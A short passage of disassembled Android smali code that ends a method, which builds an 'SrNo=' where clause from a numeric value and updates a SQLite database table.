    const-string v4, "SrNo="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1, p2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v0, v3, v4}, Landroid/database/sqlite/SQLiteDatabase;->update(Ljava/lang/String;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    .line 202
    return-void
.end method
